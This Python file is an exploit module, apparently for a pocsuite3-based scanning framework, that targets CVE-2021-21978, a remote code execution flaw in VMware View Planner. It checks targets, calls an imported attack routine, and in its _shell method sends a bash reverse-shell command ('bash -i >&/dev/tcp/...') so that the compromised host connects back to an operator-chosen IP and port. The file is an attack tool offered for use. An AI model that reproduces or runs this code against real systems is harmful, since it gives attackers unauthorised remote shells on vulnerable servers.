"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin

from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
from Framework.Library.Function.Function.PocSuite.Function import  decode_data_input_poc


import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import uuid
import random
from urllib.parse import urlparse, urljoin
from Framework.Library.Function.Function.PocSuite.init_pocs.cve_2021_21978 import VMware_View_Planner_rce

class DemoPOC(POCBase):
    vulID = 'CVE-2021-21978'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '03/03/2021'
    createDate = '2021-05-15'
    
    updateDate = '2020-05-15'
    references = ['https://nvd.nist.gov/vuln/detail/CVE-2021-21978']
    name = 'VMware View Planner 4.x prior to 4.6 Security Patch 1 RCE'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "language"  : [POC_SCAN.LANGUAGE.JAVA],
                "pocType" :"Software",
                "folder_init": "cve_2021_21978"}
    appName = 'vmware_view_planner_cve_2021_21978'
    appVersion = 'CVE-2021-21978'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a remote code execution vulnerability. Improper input validation and lack of authorization leading to arbitrary file upload in logupload web application. '''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSSv3: 9.8 (AV:N/AC:L/Au:N/C:P/I:P/A:P)'''
    url_result = {}

    def _verify(self, update=True):
        if update: 
            config_input, Referer = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
        result = {}
        result_url = []
        version = ""
        for url in self.url: 
            try: 
                res = requests.get(url)
                if  res.status_code == 200: 
                    result_url.append(url)
            except Exception as e: 
                pass
        if len(result_url) > 0: 
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = result_url
        if update: 
            return self.parse_output(result)
        else: 
            return result



    def _attack(self):
        config_input, Referer = decode_data_input_poc(self.headers['Referer'])
        try: 
            self.url = config_input["Input"]['RECON_WEBAPP']
            host_check_connect = config_input['Config']['Cf_Host_Check_Connect']
        except Exception as e: 
            raise Exception("Error " + self.appName + " :" + str(e) )
        result = {}
        vul_url = []
        url_check_result = ""
        if len(self._verify(update=False)) > 0: 
            for url in self.url: 
                try: 
                    url_check = VMware_View_Planner_rce.attack(url, host_check_connect)
                    if url_check: 
                        vul_url.append(url)
                        url_check_result = url_check
                except Exception as e: 
                    pass
            if len(vul_url) > 0: 
                result['ShellInfo'] = {}
                result['ShellInfo']['url'] =  vul_url
                result["ShellInfo"]['url_check_vul'] = url_check_result
                result['ShellInfo']['info'] = ''' VMware View Planner RCE ''' 
            else: 
                self.parse_output(result)
        else: 
            self.parse_output(result)




    def _shell(self):
        result = {}
        result['ShellInfo'] = {
                'Status': 'Success'
            }
        try:
            config_input,  Referer = decode_data_input_poc(self.headers['Referer'])
            try:
                self.url = config_input['Input']['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
                host_check_connect = config_input['Config']['Cf_Host_Check_Connect']
                
            except Exception as e:
                raise Exception("Error " +  self.appName +   " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            command = "bash -i >&/dev/tcp/{0}/{1} 0>&1".format(lhost_running, lport_running)
            VMware_View_Planner_rce.shell(self.url,command)
            result["url"] = self.url
            result["info_reverse_shell"] = {
                "PublicIP": lhost_running,
                "PublicPort": lport_running

            }
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell ", self.name, e)
            pass
        return self.parse_output(False)


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)
